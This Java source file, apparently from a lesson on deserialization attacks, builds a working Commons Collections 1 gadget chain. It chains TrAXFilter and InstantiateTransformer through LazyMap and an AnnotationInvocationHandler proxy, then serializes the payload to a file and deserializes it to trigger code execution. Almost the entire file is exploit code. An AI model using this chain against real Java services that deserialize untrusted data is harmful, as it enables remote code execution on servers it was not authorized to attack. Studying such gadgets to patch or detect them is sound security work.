package edu.demo.lesson3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import edu.demo.makeTemplates.MakeTemplates;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Documented;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class LzMap {
    public static void main(String[] args) throws Exception{
        //get templatesChian
        MakeTemplates makeTemplates = new MakeTemplates();
        Templates templates = (Templates) makeTemplates.makeTemplate();
        //use LzMap && Annotation...Handler (CC1-Gadget)
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        //test chain
        //chain.transform("foo");
        HashMap hashMap = new HashMap();
        LazyMap lzMap = (LazyMap) LazyMap.decorate(hashMap, chain);
        //test lazyMapChain
        //lzMap.get("foo");
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Documented.class, lzMap);
        Map proxyLzmap = (Map) Proxy.newProxyInstance(lzMap.getClass().getClassLoader(),
                lzMap.getClass().getInterfaces(),
                handler
                );
        Object payload = ctor.newInstance(Documented.class, proxyLzmap);
        //test serialize
        LzMap.testSer(payload);
    }

    public static void testSer(Object payload) throws Exception{
        //ser
        FileOutputStream file = new FileOutputStream("Red.bin");
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(payload);
        se.close();
        //deser
        FileInputStream file1 = new FileInputStream("Red.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        unse.readObject();
        unse.close();
    }
}
